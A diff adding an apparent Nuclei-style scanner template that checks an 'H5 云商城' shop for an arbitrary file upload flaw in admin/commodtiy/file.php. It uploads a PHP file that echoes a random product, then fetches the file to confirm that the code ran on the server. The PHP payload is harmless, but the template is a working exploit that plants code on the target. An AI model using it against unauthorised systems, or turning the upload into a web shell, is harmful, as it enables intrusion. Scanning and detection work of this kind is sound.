@@ -1,0 +1,55 @@
+id: poc-yaml-h5-cloud-mall-file-php-anyfile-upload
+info:
+  name: H5 云商城 file.php 任意文件上传漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+variables:
+  t1: "{{rand_int(100,1000)}}"
+  t2: "{{rand_int(100,1000)}}"
+  t3: "{{to_number(t1)*to_number(t2)}}"
+flow: |
+  http(1) && http(2)
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/admin/commodtiy/file.php?upload=1"
+    headers:
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFQqYtrIWb8iBxUCx
+    body: |-
+      ------WebKitFormBoundaryFQqYtrIWb8iBxUCx
+      Content-Disposition: form-data; name="file"; filename="{{t1}}.php"
+      Content-Type: application/octet-stream
+
+      <?php echo {{t1}}*{{t2}};?>
+      ------WebKitFormBoundaryFQqYtrIWb8iBxUCx--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - ".php"
+    extractors:
+      - type: regex
+        name: file
+        internal: true
+        part: body
+        regex:
+          - "(?P<file>[0-9]+)"
+  - id: verify-uploaded-file
+    method: GET
+    path:
+      - "{{BaseURL}}/admin/commodtiy/upload/{{file}}.php"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{t3}}"
